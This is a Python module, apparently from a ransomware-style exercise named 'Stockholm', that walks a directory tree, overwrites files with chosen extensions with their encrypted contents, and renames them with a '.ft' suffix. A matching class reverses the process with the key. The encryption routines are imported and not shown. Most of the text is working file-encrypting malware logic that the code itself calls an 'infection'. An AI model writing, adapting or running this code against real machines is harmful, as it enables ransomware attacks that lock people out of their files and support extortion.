"""Library of functions to find and encrypt the wanted files"""

import os
import hashlib
from src.cipher_functions import encrypt_manual
from src.cipher_functions import decrypt_manual

class Stockholminfection:
    """Class in charge of create the infection"""
    def __init__(self, logger, path, extensions, key):
        self.logger = logger
        self.path = path
        self.extensions = extensions
        self.key = key
        self._set_key()
        self.files = []

    def run(self):
        """run the engine of the infection"""

    def validate_hexadecimal_key(self):
        """Function to validate master key"""
        try:
            bytes.fromhex(self.key.decode("utf-8"))
        except ValueError:
            self.logger.logger.error("The key is not hexadecimal key")
            return False
        try:
            self._count_key_length()
        except ValueError:
            self.logger.logger.error("The key must have at least 64 Hex characters")
            return False
        self.key = hashlib.sha256(self.key).digest()
        return True

    def _count_key_length(self):
        """Function to check if the key has at least 64 hexadecimal characters"""
        if len(self.key) >= 32:
            return True
        raise ValueError

    def _set_key(self):
        """set the key"""

    def _search_extension(self, extension, extensions_library = "ft"):
        if extension in extensions_library:
            return True
        return False

class Encryptation(Stockholminfection):
    """Inherited class to encrypt"""
    def run(self):
        """Function that executes the infection"""
        self.search_files()
        self.cipher_and_rename_files()

    def _set_key(self):
        with open(self.key, 'rb') as keyfile:
            key = keyfile.read()
        self.key = key

    def search_files(self):
        """Function that find the desired extensions"""
        for root, directories, files in os.walk(self.path):
            for file in files:
                if self._search_extension(file.split(".")[-1], self.extensions):
                    self.files.append(root + '\\' + file)

    def cipher_and_rename_files(self):
        """function that cipher files"""
        if len(self.files) == 0:
            self.logger.logger.info("Nothing to cipher")
        for file in self.files:
            self.logger.logger.info("Ciphering " + file)
            #try:
            with open(file, 'rb') as textfile:
                data_to_encrypt = textfile.read()
                textfile.close()
            with open(file, 'wb') as cipheredfile:
                cipheredfile.write(encrypt_manual(data_to_encrypt, self.key))
            os.rename(file, file + ".ft")
            self.logger.logger.info("Successfully encrypted " + file + " !!!\n")
            #except Exception:
            #    cipheredfile.close()
            #    self.logger.logger.error("Unable to encrypt " + file + " :( \n")

class Desencryptation(Stockholminfection):
    """Inherited class to encrypt"""
    def _set_key(self):
        """Modification of super set key"""
        self.key = bytes(self.key, 'utf-8')

    def run(self):
        """Function that undo the encryptation"""
        self.search_files()
        self.uncipher_and_rename_files()

    def search_files(self):
        """Function that find the desired extensions"""
        for root, directories, files in os.walk(self.path):
            for file in files:
                if self._search_extension(file.split(".")[-1]):
                    self.files.append(root + '\\' + file)

    def uncipher_and_rename_files(self):
        """Function that uncipher files"""
        if len(self.files) == 0:
            self.logger.logger.info("Nothing to decrypt")
        for file in self.files:
            self.logger.logger.info("Decrypting " + file)
            #try:
            with open(file, 'rb') as textfile:
                data_to_decrypt = textfile.read()
                textfile.close()
            with open(file, 'wb') as uncipheredfile:
                uncipheredfile.write(decrypt_manual(data_to_decrypt, self.key))
            os.rename(file, file.split(".ft")[0])
            self.logger.logger.info("Successfully decrypt " + file + " !!!\n")
            #except Exception:
            #    uncipheredfile.close()
            #    self.logger.logger.error("Unable to decrypt " + file + " :( \n")
